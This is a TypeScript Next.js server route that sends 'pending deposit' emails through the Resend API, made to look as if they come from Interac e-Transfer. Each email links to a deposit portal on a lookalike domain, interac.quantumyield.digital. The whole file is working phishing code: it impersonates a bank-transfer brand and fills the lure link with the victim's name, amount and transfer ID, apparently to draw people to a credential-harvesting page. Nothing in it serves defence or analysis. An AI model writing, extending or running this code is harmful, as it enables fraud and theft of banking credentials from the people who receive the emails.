import { type NextRequest, NextResponse } from "next/server"
import { generateEmailByTemplateId } from "@/lib/email-template-generators"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { recipient, recipientName, amount, transferId, bankName, message, timestamp } = body

    if (!recipient || !amount || !transferId) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    const resendApiKey = process.env.RESEND_API_KEY
    if (!resendApiKey) {
      return NextResponse.json(
        { error: "Email service not configured. Please add RESEND_API_KEY to environment variables." },
        { status: 500 },
      )
    }

    const amountNumber = typeof amount === "string" ? Number.parseFloat(amount) : amount
    if (isNaN(amountNumber)) {
      return NextResponse.json({ error: "Invalid amount format" }, { status: 400 })
    }

    const depositBaseUrl = "https://interac.quantumyield.digital"
    const depositParams = new URLSearchParams({
      transferId,
      amount: amountNumber.toString(),
      recipient,
      recipientName: recipientName || "",
      bankName: bankName || "Banking System",
      message: message || "",
      timestamp: timestamp?.toString() || Date.now().toString(),
    })
    const depositLink = `${depositBaseUrl}/deposit-portal?${depositParams.toString()}`

    const html = generateEmailByTemplateId("deposit-on-hold", {
      recipientName: recipientName || recipient,
      amount: amountNumber,
      message: message || `Transaction ID: ${transferId}`,
      depositLink,
      transferId,
      senderName: "Interac e-Transfer",
      bankName: bankName || "Banking System",
    })

    if (!html) {
      return NextResponse.json({ error: "Failed to generate email template" }, { status: 500 })
    }

    const fromAddress = process.env.RESEND_FROM_EMAIL || "Interac e-Transfer <onboarding@resend.dev>"
    console.log("[v0] send-pending-deposit — from:", fromAddress, "to:", recipient)

    const response = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${resendApiKey}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        from: fromAddress,
        to: [recipient],
        subject: `Pending Deposit Notification — ${transferId}`,
        html,
      }),
    })

    const resendData = await response.json()
    console.log("[v0] send-pending-deposit Resend response:", response.status, JSON.stringify(resendData))

    if (!response.ok) {
      return NextResponse.json(
        { error: `Resend error (${response.status}): ${resendData?.message || JSON.stringify(resendData)}` },
        { status: 500 }
      )
    }

    return NextResponse.json({ success: true, emailId: resendData?.id, message: "Pending deposit email sent successfully" })
  } catch (error) {
    console.error("[v0] Error sending pending deposit email:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
